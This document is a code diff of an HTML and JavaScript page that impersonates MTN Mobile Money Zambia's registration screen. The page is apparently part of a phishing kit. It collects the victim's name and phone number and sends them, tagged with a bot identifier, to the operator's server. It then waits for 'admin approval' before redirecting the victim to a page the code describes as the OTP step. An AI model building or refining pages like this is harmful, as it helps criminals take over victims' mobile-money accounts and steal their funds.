@@ -1,409 +1,468 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MTN Mobile Money - Register</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        html, body {
-            width: 100%;
-            height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #fff;
-            color: #333;
-        }
-        body {
-            display: flex;
-            flex-direction: column;
-        }
-        .top-bar {
-            width: 100%;
-            height: 72px;
-            background: #FFCC00; /* MTN Yellow */
-            display: flex;
-            align-items: center;
-            padding: 0 22px;
-            flex-shrink: 0;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-        .top-bar .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .top-bar .logo svg {
-            height: 36px;
-            width: auto;
-        }
-        .top-bar .logo span {
-            font-weight: 700;
-            font-size: 18px;
-            color: #004B87; /* MTN Blue */
-            letter-spacing: -0.5px;
-        }
-        .back-btn {
-            color: #004B87;
-            text-decoration: none;
-            font-size: 30px;
-            font-weight: 300;
-            line-height: 1;
-            margin-right: 16px;
-        }
-        .container {
-            flex: 1;
-            width: 100%;
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 34px 28px 24px;
-            display: flex;
-            flex-direction: column;
-        }
-        #detailsForm {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        .title {
-            font-size: 28px;
-            font-weight: 700;
-            color: #004B87;
-            margin-bottom: 6px;
-            letter-spacing: -0.5px;
-        }
-        .subtitle {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.5;
-            margin-bottom: 32px;
-            font-weight: 400;
-        }
-        .phone-input-wrap {
-            position: relative;
-            width: 100%;
-            margin-bottom: 0;
-        }
-        .phone-input-wrap input {
-            width: 100%;
-            height: 58px;
-            border: 2px solid #004B87;
-            border-radius: 10px;
-            background: #fff;
-            padding: 0 16px 0 90px;
-            font-size: 17px;
-            color: #333;
-            outline: none;
-            transition: .2s;
-        }
-        .phone-input-wrap input::placeholder {
-            color: #999;
-            font-weight: 400;
-        }
-        .phone-input-wrap input:focus {
-            border-color: #FFCC00;
-            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
-        }
-        .country-code {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 17px;
-            font-weight: 600;
-            color: #004B87;
-            pointer-events: none;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .country-code::after {
-            content: "▼";
-            font-size: 12px;
-            color: #004B87;
-            margin-left: 4px;
-        }
-        .bottom-section {
-            margin-top: auto;
-            padding-bottom: 10px;
-        }
-        .checkbox-wrap {
-            display: none;
-        }
-        #termsCheck {
-            display: none;
-        }
-        button {
-            width: 100%;
-            height: 56px;
-            border: none;
-            border-radius: 10px;
-            font-size: 20px;
-            font-weight: 700;
-            color: #fff;
-            background: #ccc;
-            cursor: not-allowed;
-            transition: .2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        button:enabled {
-            background: #FFCC00;
-            color: #004B87;
-            cursor: pointer;
-        }
-        button:enabled:hover {
-            background: #e6b800;
-        }
-        .status {
-            display: none;
-            margin-top: 15px;
-            text-align: center;
-            color: #666;
-            font-size: 14px;
-        }
-        .status.error {
-            color: #b00020;
-            background: #fde7e7;
-            padding: 10px;
-            border-radius: 8px;
-        }
-        .spinner {
-            display: none;
-            width: 34px;
-            height: 34px;
-            margin: 18px auto 0;
-            border: 3px solid rgba(0, 75, 135, .15);
-            border-top: 3px solid #004B87;
-            border-radius: 50%;
-            animation: spin .8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        @media (max-width: 480px) {
-            .container {
-                padding: 28px 20px 22px;
-            }
-            .title {
-                font-size: 24px;
-            }
-            .subtitle {
-                font-size: 15px;
-            }
-            .phone-input-wrap input {
-                height: 56px;
-                font-size: 16px;
-                padding-left: 84px;
-            }
-            .country-code {
-                font-size: 16px;
-                left: 14px;
-            }
-            button {
-                height: 56px;
-                font-size: 19px;
-            }
-        }
-        @media (max-width: 360px) {
-            .container {
-                padding: 24px 16px 18px;
-            }
-            .title {
-                font-size: 22px;
-            }
-            .subtitle {
-                font-size: 14px;
-            }
-            .phone-input-wrap input {
-                height: 54px;
-                font-size: 15px;
-                padding-left: 76px;
-            }
-            .country-code {
-                font-size: 15px;
-            }
-            button {
-                font-size: 18px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MTN Mobile Money - Register</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #fff;
+      color: #333;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .top-bar {
+      width: 100%;
+      height: 72px;
+      background: #FFCC00;
+      display: flex;
+      align-items: center;
+      padding: 0 22px;
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .top-bar .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .top-bar .logo svg {
+      height: 36px;
+      width: auto;
+    }
+
+    .top-bar .logo span {
+      font-weight: 700;
+      font-size: 18px;
+      color: #004B87;
+      letter-spacing: -0.5px;
+    }
+
+    .back-btn {
+      color: #004B87;
+      text-decoration: none;
+      font-size: 30px;
+      font-weight: 300;
+      line-height: 1;
+      margin-right: 16px;
+    }
+
+    .container {
+      flex: 1;
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 34px 28px 24px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #detailsForm {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #004B87;
+      margin-bottom: 6px;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 32px;
+      font-weight: 400;
+    }
+
+    .phone-input-wrap {
+      position: relative;
+      width: 100%;
+      margin-bottom: 0;
+    }
+
+    .phone-input-wrap input {
+      width: 100%;
+      height: 58px;
+      border: 2px solid #004B87;
+      border-radius: 10px;
+      background: #fff;
+      padding: 0 16px 0 90px;
+      font-size: 17px;
+      color: #333;
+      outline: none;
+      transition: .2s;
+    }
+
+    .phone-input-wrap input::placeholder {
+      color: #999;
+      font-weight: 400;
+    }
+
+    .phone-input-wrap input:focus {
+      border-color: #FFCC00;
+      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+    }
+
+    .country-code {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 17px;
+      font-weight: 600;
+      color: #004B87;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .country-code::after {
+      content: "▼";
+      font-size: 12px;
+      color: #004B87;
+      margin-left: 4px;
+    }
+
+    .bottom-section {
+      margin-top: auto;
+      padding-bottom: 10px;
+    }
+
+    button {
+      width: 100%;
+      height: 56px;
+      border: none;
+      border-radius: 10px;
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+      background: #ccc;
+      cursor: not-allowed;
+      transition: .2s;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    button:enabled {
+      background: #FFCC00;
+      color: #004B87;
+      cursor: pointer;
+    }
+
+    button:enabled:hover {
+      background: #e6b800;
+    }
+
+    .status {
+      display: none;
+      margin-top: 15px;
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+    }
+
+    .status.error {
+      color: #b00020;
+      background: #fde7e7;
+      padding: 10px;
+      border-radius: 8px;
+    }
+
+    .status.success {
+      color: #166534;
+      background: #dcfce7;
+      padding: 10px;
+      border-radius: 8px;
+    }
+
+    .spinner {
+      display: none;
+      width: 34px;
+      height: 34px;
+      margin: 18px auto 0;
+      border: 3px solid rgba(0, 75, 135, .15);
+      border-top: 3px solid #004B87;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 28px 20px 22px;
+      }
+      .title {
+        font-size: 24px;
+      }
+      .subtitle {
+        font-size: 15px;
+      }
+      .phone-input-wrap input {
+        height: 56px;
+        font-size: 16px;
+        padding-left: 84px;
+      }
+      .country-code {
+        font-size: 16px;
+        left: 14px;
+      }
+      button {
+        height: 56px;
+        font-size: 19px;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .container {
+        padding: 24px 16px 18px;
+      }
+      .title {
+        font-size: 22px;
+      }
+      .subtitle {
+        font-size: 14px;
+      }
+      .phone-input-wrap input {
+        height: 54px;
+        font-size: 15px;
+        padding-left: 76px;
+      }
+      .country-code {
+        font-size: 15px;
+      }
+      button {
+        font-size: 18px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <a href="javascript:history.back()" class="back-btn">&#8592;</a>
-        <div class="logo">
-            <!-- MTN MoMo SVG Logo (placeholder) -->
-            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN</text>
-            </svg>
-            <span>Mobile Money</span>
-        </div>
+  <div class="top-bar">
+    <a href="javascript:history.back()" class="back-btn">&#8592;</a>
+    <div class="logo">
+      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
+        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
+        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN</text>
+      </svg>
+      <span>Mobile Money</span>
     </div>
+  </div>
 
-    <div class="container">
-        <div class="title">Registration</div>
-        <div class="subtitle">Welcome to MTN Mobile Money Zambia</div>
+  <div class="container">
+    <div class="title">Registration</div>
+    <div class="subtitle">Welcome to MTN Mobile Money Zambia</div>
 
-        <form id="detailsForm" class="form-content">
-            <div class="phone-input-wrap">
-                <span class="country-code">+260</span>
-                <input
-                    type="tel"
-                    id="phone"
-                    name="phone"
-                    placeholder="Mobile Number"
-                    autocomplete="tel-national"
-                    required>
-            </div>
-            <div class="bottom-section">
-                <div class="checkbox-wrap">
-                    <input type="checkbox" id="termsCheck" checked required>
-                    <label for="termsCheck">Terms (hidden)</label>
-                </div>
-                <button type="submit" class="primary" id="continueBtn" disabled>
-                    SUBMIT
-                </button>
-            </div>
-        </form>
+    <form id="detailsForm" class="form-content">
+      <div class="phone-input-wrap">
+        <span class="country-code">+260</span>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="Mobile Number"
+          autocomplete="tel-national"
+          required>
+      </div>
+      <div class="bottom-section">
+        <button type="submit" class="primary" id="continueBtn" disabled>
+          SUBMIT
+        </button>
+      </div>
+    </form>
 
-        <div id="status" class="status"></div>
-        <div id="spinner" class="spinner"></div>
-    </div>
+    <div id="status" class="status"></div>
+    <div id="spinner" class="spinner"></div>
+  </div>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            const form = document.getElementById("detailsForm");
-            const phone = document.getElementById("phone");
-            const terms = document.getElementById("termsCheck");
-            const button = document.getElementById("continueBtn");
-            const spinner = document.getElementById("spinner");
-            const status = document.getElementById("status");
+  <script>
+    // ---------- CONFIG ----------
+    const params = new URLSearchParams(window.location.search);
+    let botId = params.get('botId') || localStorage.getItem('botId');
+    if (!botId) {
+      botId = 'bot1';
+      localStorage.setItem('botId', botId);
+    }
+    // Ensure URL has botId for bookmarking
+    if (!params.has('botId')) {
+      const newUrl = window.location.pathname + '?botId=' + botId;
+      window.history.replaceState({}, '', newUrl);
+    }
 
-            function validateForm() {
-                const phoneNumber = phone.value.replace(/\D/g, "");
-                if (phoneNumber.length >= 8 && terms.checked) {
-                    button.disabled = false;
-                } else {
-                    button.disabled = true;
-                }
-            }
+    // ---------- USER NAME ----------
+    let fullName = localStorage.getItem('fullName');
+    if (!fullName) {
+      fullName = prompt('Please enter your full name:') || 'MTN User';
+      localStorage.setItem('fullName', fullName);
+    }
 
-            phone.addEventListener("input", function() {
-                this.value = this.value.replace(/\D/g, "");
-                validateForm();
-            });
+    // ---------- DOM REFS ----------
+    const form = document.getElementById('detailsForm');
+    const phone = document.getElementById('phone');
+    const button = document.getElementById('continueBtn');
+    const statusEl = document.getElementById('status');
+    const spinner = document.getElementById('spinner');
 
-            terms.addEventListener("change", validateForm);
+    let pollTimer = null;
 
-            form.addEventListener("submit", function(e) {
-                e.preventDefault();
-                button.disabled = true;
-                spinner.style.display = "block";
-                status.style.display = "block";
-                status.textContent = "⏳ Awaiting approval...";
-                // Actual submission logic is below
-            });
-        });
-    </script>
+    // ---------- VALIDATION ----------
+    function validateForm() {
+      const phoneNumber = phone.value.replace(/\D/g, '');
+      button.disabled = (phoneNumber.length < 8);
+    }
 
-    <script>
-        // Main logic
-        let fullName = localStorage.getItem('fullName');
-        if (!fullName) {
-            fullName = 'MTN User';
-            localStorage.setItem('fullName', fullName);
-        }
+    phone.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+      validateForm();
+    });
 
-        const params = new URLSearchParams(window.location.search);
-        const urlBotId = params.get('botId');
-        if (urlBotId) localStorage.setItem('botId', urlBotId);
-        const botId = localStorage.getItem('botId');
+    // ---------- HELPER: CLEAR POLLING ----------
+    function stopPolling() {
+      if (pollTimer) {
+        clearInterval(pollTimer);
+        pollTimer = null;
+      }
+    }
 
-        if (!botId) {
-            alert('Session expired. Please start over.');
-            window.location.href = 'index.html';
-        }
+    // ---------- HELPER: SET STATUS ----------
+    function setStatus(message, type) {
+      statusEl.style.display = 'block';
+      statusEl.className = 'status ' + (type || '');
+      statusEl.textContent = message;
+    }
 
-        const form = document.getElementById('detailsForm');
-        const statusEl = document.getElementById('status');
-        const spinner = document.getElementById('spinner');
-        const nextButton = form.querySelector('button.primary');
-        const termsCheck = document.getElementById('termsCheck');
+    function hideStatus() {
+      statusEl.style.display = 'none';
+      statusEl.className = 'status';
+      statusEl.textContent = '';
+    }
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            if (!termsCheck.checked) {
-                statusEl.style.display = 'block';
-                statusEl.className = 'status error';
-                statusEl.textContent = '❌ Please accept the terms and conditions';
-                return;
-            }
-            nextButton.disabled = true;
-            const phone = document.getElementById('phone').value.trim();
-            if (!phone) {
-                statusEl.style.display = 'block';
-                statusEl.className = 'status error';
-                statusEl.textContent = '❌ Please enter a phone number';
-                nextButton.disabled = false;
-                return;
-            }
-            localStorage.setItem('phone', phone);
-            statusEl.style.display = 'block';
-            spinner.style.display = 'block';
-            statusEl.className = 'status';
-            statusEl.textContent = '⏳ Awaiting approval...';
+    // ---------- FORM SUBMIT ----------
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-            try {
-                const res = await fetch(`${window.location.origin}/submit-phone`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name: fullName, phone, botId })
-                });
-                if (!res.ok) throw new Error('Server error');
-                const { requestId } = await res.json();
-                pollApproval(requestId);
-            } catch (error) {
-                spinner.style.display = 'none';
-                statusEl.className = 'status error';
-                statusEl.textContent = '❌ Server error. Please try again.';
-                nextButton.disabled = false;
-            }
+      const phoneVal = phone.value.trim();
+      if (!phoneVal) {
+        setStatus('❌ Please enter a phone number.', 'error');
+        return;
+      }
+
+      // Disable button and show spinner
+      button.disabled = true;
+      spinner.style.display = 'block';
+      hideStatus();
+      setStatus('⏳ Awaiting admin approval...');
+
+      try {
+        const res = await fetch('/submit-phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
         });
 
-        function pollApproval(requestId) {
-            const interval = setInterval(async () => {
-                try {
-                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
-                    const data = await res.json();
-                    if (data.redirect) {
-                        clearInterval(interval);
-                        window.location.href = data.redirect;
-                        return;
-                    }
-                    if (data.approved === false) {
-                        clearInterval(interval);
-                        spinner.style.display = 'none';
-                        statusEl.className = 'status error';
-                        statusEl.textContent = '❌ Phone number rejected. Please try again.';
-                        nextButton.disabled = false;
-                    }
-                    if (data.approved === true) {
-                        clearInterval(interval);
-                        window.location.href = 'link.html'; // fallback
-                    }
-                } catch (error) {
-                    console.error('Polling error:', error);
-                }
-            }, 2000);
+        if (!res.ok) {
+          const errText = await res.text();
+          throw new Error(errText || 'Server error');
         }
-    </script>
 
+        const { requestId } = await res.json();
+
+        // Store phone and requestId for the next page
+        localStorage.setItem('phone', phoneVal);
+        localStorage.setItem('phoneRequestId', requestId);
+
+        // Start polling
+        stopPolling();
+        let attempts = 0;
+        const MAX_ATTEMPTS = 120;
+
+        pollTimer = setInterval(async () => {
+          attempts++;
+          try {
+            const checkRes = await fetch('/check-phone/' + requestId);
+            const data = await checkRes.json();
+
+            // 🔥 Backend now returns { approved: true } (not { redirect })
+            if (data.approved === true) {
+              stopPolling();
+              spinner.style.display = 'none';
+              setStatus('✅ Phone approved! Redirecting...', 'success');
+              // Pass requestId, phone, and botId to OTP page
+              const redirectUrl = 'link.html?requestId=' + requestId +
+                                  '&phone=' + encodeURIComponent(phoneVal) +
+                                  '&botId=' + botId;
+              setTimeout(() => {
+                window.location.href = redirectUrl;
+              }, 800);
+              return;
+            }
+
+            if (data.approved === false) {
+              stopPolling();
+              spinner.style.display = 'none';
+              setStatus('❌ Phone number rejected. Please try again.', 'error');
+              button.disabled = false;
+              return;
+            }
+
+            // Timeout
+            if (attempts > MAX_ATTEMPTS) {
+              stopPolling();
+              spinner.style.display = 'none';
+              setStatus(
+                '⏳ Approval taking too long. Please refresh or contact support.',
+                'error'
+              );
+              button.disabled = false;
+              return;
+            }
+
+            // Still pending – update status occasionally
+            if (attempts % 10 === 0) {
+              const seconds = Math.round(attempts * 1.5);
+              setStatus('⏳ Waiting for admin approval... (' + seconds + 's)');
+            }
+
+          } catch (err) {
+            console.error('Polling error:', err);
+            // Don't stop polling – network glitch might recover
+          }
+        }, 1500);
+
+      } catch (error) {
+        spinner.style.display = 'none';
+        setStatus('❌ Server error: ' + error.message, 'error');
+        button.disabled = false;
+      }
+    });
+
+    // ---------- INIT ----------
+    validateForm();
+  </script>
 </body>
 </html>
